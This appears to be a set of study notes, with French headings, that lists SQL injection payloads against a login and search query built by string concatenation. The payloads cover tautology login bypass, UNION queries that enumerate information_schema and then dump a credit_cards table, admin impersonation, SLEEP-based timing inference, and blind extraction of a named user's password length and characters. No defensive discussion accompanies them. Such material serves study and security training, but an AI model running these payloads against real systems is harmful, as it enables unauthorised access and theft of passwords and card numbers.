-- tautologie :

SELECT * FROM users WHERE username='" . $uname . "' and password='" . $pword . "' OR 1=1; -- 

-- union

SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' UNION (SELECT 1,2,3,4 FROM dual); -- %';

SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA,3,4 FROM information_schema.tables); -- %';

SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' UNION (SELECT COLUMN_NAME, 2, 3, 4 FROM information_schema.columns WHERE TABLE_NAME = 'credit_cards'); -- %';


SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' UNION (SELECT user_id, credit_card_number, 3, 4 FROM credit_cards); -- %';


-- piggy-backed


SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' OR username = 'admin' --; 



-- inference : timing

SELECT id, name, username, password FROM users WHERE username 
				LIKE '%" . $name . "%' AND 1 = SLEEP(5); -- %';



-- inference : blind

blabla' OR EXISTS ( SELECT * FROM users WHERE username='loubna') --  
blabla' OR EXISTS ( SELECT * FROM users WHERE username='loubna' AND LENGTH(password)=4) -- 
blabla' OR EXISTS ( SELECT * FROM users WHERE username='loubna' AND password LIKE 't%' ) -- 
blabla' OR EXISTS ( SELECT * FROM users WHERE username='loubna' AND password LIKE '_e%' ) -- 



SELECT * FROM users WHERE username='" . $uname . "' 
					AND password='" . $pword . "'  
					OR EXISTS ( SELECT * FROM users WHERE username='...') --  

SELECT * FROM users WHERE username='" . $uname . "' 
					AND password='" . $pword . "' 
					OR EXISTS ( SELECT * FROM users WHERE username='...' AND LENGTH(password)=x) -- 
SELECT * FROM users WHERE username='" . $uname . "' 
					AND password='" . $pword . "' 
					OR EXISTS ( SELECT * FROM users WHERE username='...' AND password LIKE 'a%' ) -- 

SELECT * FROM users WHERE username='" . $uname . "' 
					AND password='" . $pword . "' 
					OR EXISTS ( SELECT * FROM users WHERE username='...' AND password LIKE '_e%' ) -- 




